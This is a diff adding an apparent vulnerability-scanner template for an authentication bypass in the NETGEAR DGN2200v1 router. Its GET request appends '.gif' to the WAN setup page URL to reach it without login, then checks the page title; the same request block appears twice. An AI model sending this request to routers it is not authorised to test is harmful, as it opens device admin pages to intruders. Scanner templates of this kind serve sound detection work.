@@ -1,0 +1,41 @@
+id: netgear-router-auth-bypass
+brief:
+    title: NETGEAR DGN2200v1 - Authentication Bypass
+    by: gy741
+    level: high
+    about: NETGEAR DGN2200v1 router contains an authentication bypass vulnerability. It does not require authentication if a page has ".jpg", ".gif", or "ess_" substrings but matches the entire URL. Any page ...
+    label:
+        - netgear
+        - auth-bypass
+        - router
+        - vuln
+    score: CVSS:8.1
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/WAN_wan.htm?.gif'
+      head:
+        Accept: '*/*'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - <title>WAN Setup</title>
+          in: body
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/WAN_wan.htm?.gif'
+      head:
+        Accept: '*/*'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - <title>WAN Setup</title>
+          in: body
+          need: all
